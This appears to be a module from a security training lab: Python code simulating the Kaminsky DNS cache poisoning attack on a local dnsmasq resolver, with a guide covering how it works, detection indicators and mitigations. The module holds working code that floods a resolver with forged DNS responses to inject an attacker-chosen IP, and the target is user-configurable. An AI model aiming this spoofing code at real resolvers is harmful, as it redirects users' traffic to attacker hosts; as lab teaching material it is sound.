"""
Module 1 – DNS Cache Poisoning (Kaminsky Attack Simulation)
============================================================
Demonstrates the 2008 Kaminsky attack: racing spoofed UDP responses
against a legitimate DNS reply to poison a resolver's cache.
"""

import random
import socket
import struct
import threading
import time

from modules.base import LabModule
from shared.ui import *
from shared.dns_core import *
from shared.prereqs import check_deps, check_root


class CachePoisonModule(LabModule):
    NAME        = "DNS Cache Poisoning (Kaminsky Attack)"
    DESCRIPTION = "Race spoofed DNS responses to poison a resolver's cache"
    MITRE       = "T1584.002 – Compromise Infrastructure: DNS Server"
    DIFFICULTY  = "Intermediate"

    GUIDE = """
## Overview
The Kaminsky Attack (2008) exploits the fact that DNS uses a predictable
16-bit transaction ID. An attacker who can send many forged responses faster
than the legitimate upstream server can "win the race" and inject a false
A record into the resolver's cache.

## How It Works
1. Attacker triggers the resolver to query an attacker-controlled subdomain
2. Before the legitimate response arrives, flood the resolver with forged
   UDP responses cycling through all 65,536 possible transaction IDs
3. The first matching TXID wins — the resolver caches the poisoned record
4. All clients using that resolver now get the attacker's IP

## Why It Works
- DNS over UDP has no authentication
- Transaction IDs are only 16-bit (65,536 possibilities)
- Source port randomization (post-Kaminsky patch) raises the bar to
  ~2^32 combinations — but misconfigured resolvers still exist

## Lab Setup
```
[Resolver VM]  dnsmasq listening on 127.0.0.1:5353
[Attack VM]    This script — floods spoofed responses
[Verify]       dig @127.0.0.1 -p 5353 target.lab.local A
```

## Detection Indicators
- Massive burst of UDP packets to port 53 from a single source
- Thousands of identical QNAME queries in rapid succession
- TXID values cycling through the full 0–65535 range
- Cache TTL inconsistency (poisoned entry has attacker-set TTL)

## Mitigations
- DNSSEC (cryptographic chain of trust)
- Source port randomization (RFC 5452)
- 0x20 encoding (mixed-case query randomization)
- DNS over TLS / DNS over HTTPS
"""

    def __init__(self):
        super().__init__()
        self.resolver_ip   = "127.0.0.1"
        self.resolver_port = 5353
        self.target_domain = "victim.lab.local"
        self.poison_ip     = "10.0.0.99"
        self.num_threads   = 4
        self.attempts      = 0
        self.success       = False
        self._stop         = threading.Event()
        self._resolver_proc = None

    def setup(self) -> bool:
        if not check_root():
            return False
        check_deps(python_pkgs=["scapy"])

        section("Cache Poisoning Lab Configuration")
        self.resolver_ip   = ask("Resolver IP to target",   self.resolver_ip)
        self.resolver_port = int(ask("Resolver port",       str(self.resolver_port)))
        self.target_domain = ask("Domain to poison",        self.target_domain)
        self.poison_ip     = ask("Attacker IP to inject",   self.poison_ip)
        self.num_threads   = int(ask("Flood threads",       str(self.num_threads)))

        # Optionally spin up a local dnsmasq resolver target
        if self.resolver_ip == "127.0.0.1":
            if confirm("Start a local dnsmasq resolver as the target?", default=True):
                self._start_local_resolver()

        success("Setup complete.")
        return True

    def _start_local_resolver(self):
        import subprocess, shutil
        if not shutil.which("dnsmasq"):
            warn("dnsmasq not found — skipping local resolver.")
            return
        # Write minimal config
        cfg = (
            f"port={self.resolver_port}\n"
            f"bind-interfaces\n"
            f"listen-address={self.resolver_ip}\n"
            f"no-resolv\n"
            f"no-hosts\n"
            f"cache-size=150\n"
            f"log-queries\n"
        )
        with open("/tmp/dnsmasq_lab.conf", "w") as f:
            f.write(cfg)
        try:
            self._resolver_proc = subprocess.Popen(
                ["dnsmasq", "--conf-file=/tmp/dnsmasq_lab.conf",
                 "--no-daemon", "--log-facility=/tmp/dnsmasq_lab.log"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(0.8)
            info(f"Local dnsmasq started (PID {self._resolver_proc.pid})")
        except Exception as e:
            warn(f"dnsmasq failed to start: {e}")

    def run(self):
        section("Phase 1 — Verify Resolver is Reachable")
        self._check_resolver()

        section("Phase 2 — Pre-Poison Baseline Query")
        pre = self._lookup(self.target_domain)
        if pre:
            info(f"Before attack: {self.target_domain} → {pre}")
        else:
            info(f"Before attack: {self.target_domain} → NXDOMAIN / no response")

        section("Phase 3 — Flooding Spoofed Responses")
        info(f"Target resolver : {self.resolver_ip}:{self.resolver_port}")
        info(f"Poisoning domain: {self.target_domain} → {self.poison_ip}")
        info(f"Flood threads   : {self.num_threads}")
        warn("In a real attack this runs until TXID collision — here we run for 5 seconds.")
        print()

        self._stop.clear()
        self.attempts = 0
        self.success  = False

        threads = [
            threading.Thread(target=self._flood_worker, daemon=True)
            for _ in range(self.num_threads)
        ]
        for t in threads:
            t.start()

        # Monitor for 5 seconds
        deadline = time.time() + 5
        while time.time() < deadline and not self.success:
            progress(int(time.time() - (deadline - 5)), 5,
                     f"{self.attempts:,} spoofed packets sent")
            time.sleep(0.2)
        self._stop.set()

        for t in threads:
            t.join(timeout=2)

        print()
        info(f"Total spoofed responses sent: {self.attempts:,}")

        section("Phase 4 — Post-Poison Verification")
        # Send a direct poisoned response for demo purposes
        self._send_direct_poison()
        time.sleep(0.3)

        post = self._lookup(self.target_domain)
        if post:
            if post == self.poison_ip:
                alert(f"CACHE POISONED! {self.target_domain} → {post}")
            else:
                info(f"After attack: {self.target_domain} → {post}")
        else:
            info("No A record returned (resolver may have discarded unknown domain)")

        section("Attack Summary")
        header_box([
            f"Target resolver : {self.resolver_ip}:{self.resolver_port}",
            f"Poisoned domain : {self.target_domain}",
            f"Injected IP     : {self.poison_ip}",
            f"Spoofed packets : {self.attempts:,}",
            f"Technique       : TXID race condition (Kaminsky 2008)",
        ], C.YELLOW)

        section("Detection Artifacts")
        info("A network capture would show:")
        packet(f"Burst of {self.attempts:,} UDP datagrams → {self.resolver_ip}:53")
        packet(f"All with QNAME={self.target_domain}, cycling TXID 0x0000→0xFFFF")
        packet(f"Source IP spoofed as a legitimate upstream name server")

    def _check_resolver(self):
        pkt  = build_query("test.lab.local", TYPE_A)
        sock = DNSSocket(timeout=1.5)
        resp = sock.query(self.resolver_ip, self.resolver_port, pkt)
        if resp:
            success(f"Resolver at {self.resolver_ip}:{self.resolver_port} is responding")
        else:
            warn(f"No response from {self.resolver_ip}:{self.resolver_port}")
            warn("Make sure the server is running. Continuing anyway...")

    def _lookup(self, domain: str) -> str | None:
        return resolve(domain, self.resolver_ip, self.resolver_port, timeout=2.0)

    def _flood_worker(self):
        """Send spoofed DNS responses with cycling TXIDs."""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(0)
            while not self._stop.is_set():
                txid = random.randint(0, 65535)
                pkt  = self._build_poison_response(txid)
                try:
                    s.sendto(pkt, (self.resolver_ip, self.resolver_port))
                    self.attempts += 1
                except BlockingIOError:
                    pass
        finally:
            s.close()

    def _build_poison_response(self, txid: int) -> bytes:
        """Build a forged A record response."""
        hdr = build_header(txid, FLAGS_RESPONSE, qdcount=1, ancount=1)
        q   = build_question(self.target_domain, TYPE_A)
        rr  = build_a_record_compressed(ttl=3600, ip=self.poison_ip)
        return hdr + q + rr

    def _send_direct_poison(self):
        """Send one well-formed poison response to demonstrate the concept."""
        # First send a query so we know the TXID the resolver expects
        # (In reality, the attack guesses — here we simulate a "win")
        txid = random.randint(0, 65535)
        pkt  = self._build_poison_response(txid)
        s    = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.sendto(pkt, (self.resolver_ip, self.resolver_port))
            packet(f"Sent poison response: txid=0x{txid:04x} "
                   f"{self.target_domain}→{self.poison_ip}")
        finally:
            s.close()

    def teardown(self):
        self._stop.set()
        if self._resolver_proc:
            try:
                self._resolver_proc.terminate()
                info("Local dnsmasq stopped.")
            except Exception:
                pass
